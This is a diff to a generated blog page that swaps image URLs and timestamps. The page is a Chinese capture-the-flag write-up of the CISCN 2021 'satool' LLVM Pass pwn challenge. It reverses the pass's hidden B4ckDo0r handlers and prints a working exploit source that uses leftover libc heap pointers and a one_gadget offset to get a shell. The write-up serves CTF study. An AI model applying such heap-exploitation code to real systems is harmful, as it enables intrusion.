@@ -35,42 +35,42 @@
 <meta property="og:site_name" content="HFTTC&#39;s Blog">
 <meta property="og:description" content="第一次写 LLVM 的题目，感觉很难读懂，即使写完了也有一点懵懵的  runOnFunction函数位于虚表中的最后一个位置，比赛题的漏洞基本就是这个，所以在做LLVM Pass pwn的时候定位函数的位置可以从虚表入手：可以直接搜索虚表 vtable 的位置   sub_19D0是虚表中的最后一个，也就是我们常说的 runOnFunction   进入之后 F5 反编译一下：     坐牢，代码">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780989268817-e826571e-93f4-4484-abd2-33dfcb793bc2.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780989552387-dba1fe88-de88-4a2b-8872-cc50afbfafa6.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780989718829-55749130-e323-4ad5-aeac-cd61251895cb.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780989737262-ca5e73de-1da6-4ab9-93c6-2cbd39bd18ae.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780992994425-919f0f95-dc02-4cfb-9a76-50287647fec4.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780993484601-e8f12550-0a8a-483a-94a5-cfd3d75e9988.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780993642648-599e532d-ac14-4e05-a02c-c8d0ab6b6090.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780996062648-cf167c00-8bea-48c9-8efc-a412d67cfdeb.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780994545423-4cd867c2-d875-4e6b-8c0e-6f80a41787c8.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780997903936-4a6e156d-4c79-435f-85c4-d207fc2f018e.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780998243675-2c5d83a8-2d80-4bfc-8280-faee2c6202c7.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780999119176-96a14fb3-1304-4d7a-aee1-d40edb12bad4.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780999888443-849dcb3c-96d2-4bba-b185-1804ded48ed6.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781000508697-3647dd00-57c0-432a-b1da-3c04090f21b5.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781002329130-e6815862-0c65-4208-8980-7c186fff2c29.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781003154191-68b7896f-f0a9-4233-9b29-d741ea4966d0.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781003088835-5242a544-8927-4d79-9c17-29bc33958164.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781003300254-9d0c4f30-a841-4250-9bae-05ca2cabd49d.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781003461203-d82729cc-89d3-4c7c-bf18-f475738697c7.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781004344480-15cb5c0b-15ed-4ea5-916c-7ac918e93f6c.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781004463061-474aa1eb-6821-4b1e-9617-e5e187e7617f.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781004485389-ad880754-b403-49eb-99c9-2c41901cfc56.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781004625222-1996e1f0-aec6-4f33-a144-7911f2967a61.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781004645494-39d4049e-d74d-45c3-9e56-a00ab70d4231.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781005325297-03d42795-228c-46c6-a7fb-cd7211493c56.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781008012992-8c98221c-b330-4645-94e0-779339ba60c3.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781007843588-23e620e7-bdd1-4e78-84f3-72221deb36f5.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781008706036-89b6ad97-a2bb-4d09-90fe-9d9b90e46918.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-001.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-002.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-003.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-004.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-005.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-006.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-007.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-008.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-009.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-010.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-011.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-012.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-013.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-014.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-015.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-016.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-017.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-018.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-019.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-020.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-021.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-022.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-023.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-024.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-025.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-026.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-027.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-028.png">
 <meta property="article:published_time" content="2026-06-09T02:00:00.000Z">
-<meta property="article:modified_time" content="2026-06-09T12:54:24.448Z">
+<meta property="article:modified_time" content="2026-06-09T12:59:18.695Z">
 <meta property="article:author" content="HFTTC">
 <meta property="article:tag" content="ciscn">
 <meta property="article:tag" content="llvm">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780989268817-e826571e-93f4-4484-abd2-33dfcb793bc2.png">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-001.png">
       <meta name="keywords" content="Pwn, CTF, Binary">
     <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="HFTTC's Blog" type="application/atom+xml">
     <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
@@ -315,7 +315,7 @@
     <time style="display: none;" id="post-update-time">2026-06-09</time>
   </span>
     <span class="article-date-link icon-calendar-plus" data-aos="zoom-in">
-      <time datetime="2026-06-09T12:54:24.448Z" itemprop="dateModified">2026-06-09</time>
+      <time datetime="2026-06-09T12:59:18.695Z" itemprop="dateModified">2026-06-09</time>
     </span>
 </div>
 
@@ -328,22 +328,22 @@
 <hr>
 <p><code>runOnFunction</code>函数位于虚表中的最后一个位置，比赛题的漏洞基本就是这个，所以在做LLVM Pass pwn的时候定位函数的位置可以从虚表入手：可以直接搜索虚表 vtable 的位置</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780989268817-e826571e-93f4-4484-abd2-33dfcb793bc2.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-001.png"></p>
 <p><code>sub_19D0</code>是虚表中的最后一个，也就是我们常说的 runOnFunction</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780989552387-dba1fe88-de88-4a2b-8872-cc50afbfafa6.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-002.png"></p>
 <p>进入之后 F5 反编译一下：</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780989718829-55749130-e323-4ad5-aeac-cd61251895cb.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-003.png"></p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780989737262-ca5e73de-1da6-4ab9-93c6-2cbd39bd18ae.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-004.png"></p>
 <p>坐牢，代码很长，这里不放出来了，一点一点分析吧：</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780992994425-919f0f95-dc02-4cfb-9a76-50287647fec4.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-005.png"></p>
 <p>r0oDkc4B 本身是小端序的十六进制的数值，转换成字符串之后倒序一下就是 B4ckDo0r</p>
 <p>不难看出是 backdoor</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780993484601-e8f12550-0a8a-483a-94a5-cfd3d75e9988.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-006.png"></p>
 <p>剩下的程序过于冗杂难以分析，我们直接看汇编的流程：</p>
 <p>这里是判断 cmp rdx，8；如果值相等就执行 mov rcx backdoor</p>
 <hr>
@@ -351,34 +351,34 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780993642648-599e532d-ac14-4e05-a02c-c8d0ab6b6090.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-007.png"></p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780996062648-cf167c00-8bea-48c9-8efc-a412d67cfdeb.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-008.png"></p>
 <p>我们先把断点打在跳转的位置：.so 基地址 + 0x1A14</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780994545423-4cd867c2-d875-4e6b-8c0e-6f80a41787c8.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-009.png"></p>
 <p>然后单步运行，发现最后会发生跳转</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780997903936-4a6e156d-4c79-435f-85c4-d207fc2f018e.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-010.png"></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>当我们加入 printf(“hello”); 之后会发现不会再跳转了</p>
 <p>当执行到<code>0x1A9E</code>这里时会调用<code>llvm::Value::getName</code>，在这个函数当中会获取到 printf 函数 –&gt; RAX</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780998243675-2c5d83a8-2d80-4bfc-8280-faee2c6202c7.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-011.png"></p>
 <p>继续单步执行</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780999119176-96a14fb3-1304-4d7a-aee1-d40edb12bad4.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-012.png"></p>
 <p>获取到了printf这个函数，并且长度放入rdx中，继续调试，会执行到<code>if ( !(unsigned int)std::string::compare(&amp;fnc_name, &quot;save&quot;) )</code>这条语句，RDI 一参是printf函数的名字，RSI 二参是save，这个意思就是判断是否在<code>B4ckDo0r</code>中调用了save函数</p>
 <h4 id="save"><a href="#save" class="headerlink" title="save"></a>save</h4><!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780999888443-849dcb3c-96d2-4bba-b185-1804ded48ed6.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-013.png"></p>
 <p>这样的话，我们只需要在 exp.c 当中多加一个 save()即可绕过</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>&#123;</span><br><span class="line">    save()</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781000508697-3647dd00-57c0-432a-b1da-3c04090f21b5.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-014.png"></p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781002329130-e6815862-0c65-4208-8980-7c186fff2c29.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-015.png"></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* (<span class="type">unsigned</span> <span class="type">int</span>)((v14 + <span class="number">24</span> * v17 - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)NumTotalBundleOperandsEv - v19) &gt;&gt; <span class="number">3</span>) == <span class="number">2</span> )</span><br></pre></td></tr></table></figure>
 
 <p>表明 save 当中很有可能是需要传入两个参数</p>
@@ -386,31 +386,31 @@
 
 <p>执行成功之后继续往下走：就到了核心的地方，v24 和 27 都是参数，会被 memcpy 放入内存为 0x18 的 chunk</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781003154191-68b7896f-f0a9-4233-9b29-d741ea4966d0.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-016.png"></p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781003088835-5242a544-8927-4d79-9c17-29bc33958164.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-017.png"></p>
 <p>那么 save 的作用就是申请一个大小为 0x20 的堆块，传入两个参数</p>
 <h4 id="takeaway"><a href="#takeaway" class="headerlink" title="takeaway"></a>takeaway</h4><!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781003300254-9d0c4f30-a841-4250-9bae-05ca2cabd49d.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-018.png"></p>
 <p>takeaway 当中也有：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* (<span class="type">unsigned</span> <span class="type">int</span>)((v14 + <span class="number">24</span> * v35 - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)NumTotalBundleOperandsEv_1 - v37) &gt;&gt; <span class="number">3</span>) != <span class="number">1</span> )</span><br></pre></td></tr></table></figure>
 
 <p>判断是传入了一个参数，走到最后是给释放掉了</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781003461203-d82729cc-89d3-4c7c-bf18-f475738697c7.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-019.png"></p>
 <p>俗称没什么用</p>
 <h4 id="stealkey："><a href="#stealkey：" class="headerlink" title="stealkey："></a>stealkey：</h4><!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781004344480-15cb5c0b-15ed-4ea5-916c-7ac918e93f6c.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-020.png"></p>
 <p>把 heap 的第一个八字节赋值给 byte_204100</p>
 <h4 id="fakekey："><a href="#fakekey：" class="headerlink" title="fakekey："></a>fakekey：</h4><!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781004463061-474aa1eb-6821-4b1e-9617-e5e187e7617f.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-021.png"></p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781004485389-ad880754-b403-49eb-99c9-2c41901cfc56.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-022.png"></p>
 <p>fake 有一个参数，<font style="color:rgb(51, 51, 51);">与byte_204100 相加并赋值给chunk的前8字节</font></p>
 <h4 id="run："><a href="#run：" class="headerlink" title="run："></a><font style="color:rgb(51, 51, 51);">run：</font></h4><!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781004625222-1996e1f0-aec6-4f33-a144-7911f2967a61.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-023.png"></p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781004645494-39d4049e-d74d-45c3-9e56-a00ab70d4231.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-024.png"></p>
 <p>run 没有参数</p>
 <p>但是</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((<span class="type">void</span> (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))*::heap)</span><br></pre></td></tr></table></figure>
@@ -426,26 +426,26 @@
 </ul>
 <p>因为最后会执行 *heap_ptr，所以我们可以将 *heap_ptr 改成one_gadget</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781005325297-03d42795-228c-46c6-a7fb-cd7211493c56.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-025.png"></p>
 <p><font style="color:rgb(51, 51, 51);">我们可以发现 Tcachebin 已经挂满了，我们再创建堆就会到 UnSortedbin 当中，再创建时 UnSortedbin 就会到 smallbin 当中，这个时候 chunk 中就会有残余的 libc 指针，我们就可以通过 </font>stealkey 把第一个参数赋值给</p>
 <p><font style="color:rgb(51, 51, 51);">这里可以看到，save会malloc一个0x20大小的chunk，调试发现，save一次后，tcache中没有符合要求的chunk了，再save一次，就会变成smallbins，这时候chunk中会有残留的libc指针，再通过stealkey把指针赋值给byte_204100</font></p>
 <p><font style="color:rgb(51, 51, 51);">再用fakekey对指针进行偏移的加减，改为one_gadget，执行run函数，即可</font></p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781008012992-8c98221c-b330-4645-94e0-779339ba60c3.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-026.png"></p>
 <p>最终可以获取到 shell：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">long</span> <span class="type">long</span> x)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>;<span class="type">void</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>&#123;</span><br><span class="line">    save(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>);        </span><br><span class="line">    save(<span class="string">&quot;&quot;</span>, <span class="string">&quot;aaaa&quot;</span>);        </span><br><span class="line">    stealkey();        </span><br><span class="line">    fakekey(<span class="number">-0x1ecbf0</span>+<span class="number">0xe3afe</span>);        </span><br><span class="line">    run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./opt -load ./SAPass.so -SAPass ./exp.ll -disable-output</span><br></pre></td></tr></table></figure>
 
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781007843588-23e620e7-bdd1-4e78-84f3-72221deb36f5.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-027.png"></p>
 <hr>
 <p>让人很莫名其妙的是：没有任何操作，只是加载下面的空操作</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void save(char *a, char *b);</span><br><span class="line">void stealkey();</span><br><span class="line">void fakekey(long long x);</span><br><span class="line">void run();</span><br><span class="line">void <span class="function"><span class="title">B4ckDo0r</span></span>()&#123;</span><br><span class="line">    <span class="comment"># save(&quot;aaaa&quot;, &quot;bbbb&quot;);        </span></span><br><span class="line">    <span class="comment"># save(&quot;&quot;, &quot;aaaa&quot;);        </span></span><br><span class="line">    <span class="comment"># stealkey();        </span></span><br><span class="line">    <span class="comment"># fakekey(-0x1ecbf0+0xe3afe);        </span></span><br><span class="line">    <span class="comment"># run();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>然后 bins 就会变成这样子，并且就算后面操作也一直是这种情况，不清楚是怎么回事。。。。。。</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781008706036-89b6ad97-a2bb-4d09-90fe-9d9b90e46918.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/ciscn-2021-satool/img-028.png"></p>
 
     </div>
     <footer class="article-footer">
@@ -686,7 +686,7 @@
           description: "",
           stripContent: "第一次写 LLVM 的题目，感觉很难读懂，即使写完了也有一点懵懵的  runOnFunction函数位于虚表中的最后一个位置，比赛题的漏洞基本就是这个，所以在做LLVM Pass pwn的时候定位函数的位置可以从虚表入手：可以直接搜索虚表 vtable 的位置   sub_19D0是虚表中的最后一个，也就是我们常说的 runOnFunction   进入之后 F5 反编译一下：     坐牢，代码很长，这里不放出来了，一点一点分析吧：   r0oDkc4B 本身是小端序的十六进制的数值，转换成字",
           date: "Tue Jun 09 2026 10:00:00 GMT+0800",
-          updated: "Tue Jun 09 2026 20:54:24 GMT+0800",
+          updated: "Tue Jun 09 2026 20:59:18 GMT+0800",
           cover: "/HFTTC.github.io/images/banner.webp",
         };
       </script>
